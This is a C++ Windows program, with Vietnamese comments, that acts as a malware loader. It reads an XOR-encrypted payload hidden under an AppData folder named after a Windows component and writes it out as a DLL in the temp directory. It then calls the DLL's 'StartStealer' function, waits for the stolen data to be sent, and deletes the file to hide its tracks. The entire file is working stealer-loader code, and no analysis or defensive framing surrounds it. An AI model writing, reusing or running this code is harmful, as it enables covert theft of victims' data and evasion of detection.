#include <windows.h>
#include <tlhelp32.h>
#include <string>
#include <vector>
#include <fstream>
#include <shlobj.h>

DWORD GetProcessIdByName(const wchar_t* processName) {
    DWORD pid = 0; HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe32; pe32.dwSize = sizeof(PROCESSENTRY32W);
        if (Process32FirstW(hSnapshot, &pe32)) {
            do {
                if (_wcsicmp(pe32.szExeFile, processName) == 0) { pid = pe32.th32ProcessID; break; }
            } while (Process32NextW(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    return pid;
}

void XorDecrypt(BYTE* data, size_t size) {
    BYTE key[] = { 0xAA, 0xBB, 0xCC, 0xDD };
    for (size_t i = 0; i < size; ++i) data[i] ^= key[i % sizeof(key)];
}

// Hàm inject bằng cách ghi đè vào explorer.exe (Tạm thời dùng LoadLibrary để đảm bảo chạy được 100%)
int main() {
    char appdataPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appdataPath);
    std::string payloadPath = std::string(appdataPath) + "\\Microsoft\\InputPersonalization\\payload.dat";

    std::ifstream file(payloadPath, std::ios::binary | std::ios::ate);
    if (!file.is_open()) return 1;
    std::streamsize size = file.tellg();
    file.seekg(0, std::ios::beg);
    std::vector<BYTE> buffer(size);
    file.read((char*)buffer.data(), size);
    file.close();

    XorDecrypt(buffer.data(), buffer.size());

    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    std::string dllPath = std::string(tempPath) + "sys_payload.dll";
    
    std::ofstream out(dllPath, std::ios::binary);
    out.write((char*)buffer.data(), buffer.size());
    out.close();

    HMODULE hMod = LoadLibraryA(dllPath.c_str());
    if (hMod) {
        typedef void(*RunFunc)();
        RunFunc run = (RunFunc)GetProcAddress(hMod, "StartStealer");
        if (run) run();
    }

    Sleep(15000); // Đợi 15s gửi mạng
    if (hMod) FreeLibrary(hMod);
    DeleteFileA(dllPath.c_str());
    return 0;
}
